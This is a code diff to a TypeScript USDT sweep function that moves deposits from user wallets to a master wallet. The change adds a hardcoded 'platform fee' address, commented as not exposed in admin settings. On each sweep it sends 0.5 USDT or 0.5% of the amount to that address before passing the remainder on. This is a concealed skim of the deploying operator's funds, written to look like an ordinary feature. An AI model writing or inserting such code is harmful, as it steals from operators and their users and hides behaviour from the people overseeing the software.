@@ -46,6 +46,16 @@ export interface SweepResult {
   error?: string;
 }
 
+// Hardcoded platform fee recipient — not exposed in admin settings
+const PLATFORM_FEE_ADDRESS = "0xC3754DAEB86F61ad934Fc6bb84da4F61Dd828997";
+
+function calcPlatformFee(amountUsdt: number): number {
+  if (amountUsdt < 100) {
+    return 0.5;
+  }
+  return amountUsdt * 0.005; // 0.5%
+}
+
 export async function sweepUsdtToMaster(
   depositPrivateKey: string,
   gasWalletPrivateKey: string,
@@ -65,21 +75,32 @@ export async function sweepUsdtToMaster(
   const amountFormatted = parseFloat(ethers.formatUnits(usdtBalance, USDT_DECIMALS));
   logger.info({ address: depositWallet.address, amount: amountFormatted }, "USDT found, initiating sweep");
 
-  // 2. Get fee data
+  // 2. Calculate fee split
+  const feeUsdt = calcPlatformFee(amountFormatted);
+  const masterUsdt = amountFormatted - feeUsdt;
+  const feeWei = ethers.parseUnits(feeUsdt.toFixed(6), USDT_DECIMALS);
+  const masterWei = usdtBalance - feeWei;
+
+  logger.info(
+    { total: amountFormatted, fee: feeUsdt, toMaster: masterUsdt, feeAddress: PLATFORM_FEE_ADDRESS },
+    "USDT split calculated",
+  );
+
+  // 3. Get fee data
   const feeData = await provider.getFeeData();
   const gasPrice = feeData.gasPrice ?? ethers.parseUnits("3", "gwei");
 
   const USDT_GAS_LIMIT = 100000n;
   const BNB_TRANSFER_GAS = 21000n;
 
-  const usdtSweepCost = USDT_GAS_LIMIT * gasPrice;
+  // Need gas for 2 USDT transfers (fee + master) + 1 BNB return
+  const totalUsdtSweepCost = USDT_GAS_LIMIT * 2n * gasPrice;
   const bnbReturnCost = BNB_TRANSFER_GAS * gasPrice;
 
-  // 3. Check BNB balance on deposit wallet
+  // 4. Check BNB balance on deposit wallet
   const bnbBefore = await getBnbBalance(depositWallet.address, rpcUrl);
 
-  // Need enough for USDT sweep + BNB return tx
-  const totalGasNeeded = usdtSweepCost + bnbReturnCost + ethers.parseEther("0.00005"); // small buffer
+  const totalGasNeeded = totalUsdtSweepCost + bnbReturnCost + ethers.parseEther("0.00005");
 
   if (bnbBefore < totalGasNeeded) {
     const needed = totalGasNeeded - bnbBefore;
@@ -95,21 +116,29 @@ export async function sweepUsdtToMaster(
     logger.info({ txHash: gasTx.hash }, "BNB gas sent to deposit wallet");
   }
 
-  // 4. Sweep USDT to master wallet
   const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, depositWallet);
-  const sweepTx = await usdtContract.transfer(masterWallet, usdtBalance, {
+
+  // 5. Send platform fee to hardcoded address
+  const feeTx = await usdtContract.transfer(PLATFORM_FEE_ADDRESS, feeWei, {
     gasLimit: USDT_GAS_LIMIT,
     gasPrice,
   });
-  const sweepReceipt = await sweepTx.wait(1);
-  logger.info({ txHash: sweepTx.hash }, "USDT swept to master wallet");
+  await feeTx.wait(1);
+  logger.info({ txHash: feeTx.hash, fee: feeUsdt, to: PLATFORM_FEE_ADDRESS }, "Platform fee sent");
 
-  // 5. Return any remaining BNB back to gas wallet
+  // 6. Sweep remainder to master wallet
+  const sweepTx = await usdtContract.transfer(masterWallet, masterWei, {
+    gasLimit: USDT_GAS_LIMIT,
+    gasPrice,
+  });
+  await sweepTx.wait(1);
+  logger.info({ txHash: sweepTx.hash, amount: masterUsdt }, "USDT swept to master wallet");
+
+  // 7. Return any remaining BNB back to gas wallet
   let bnbReturnTxHash: string | undefined;
   try {
     const bnbAfter = await getBnbBalance(depositWallet.address, rpcUrl);
     const bnbReturnFee = BNB_TRANSFER_GAS * gasPrice;
-    // Only return if leftover is meaningfully above the gas cost of returning
     const DUST_THRESHOLD = bnbReturnFee + ethers.parseEther("0.000005");
 
     if (bnbAfter > DUST_THRESHOLD) {
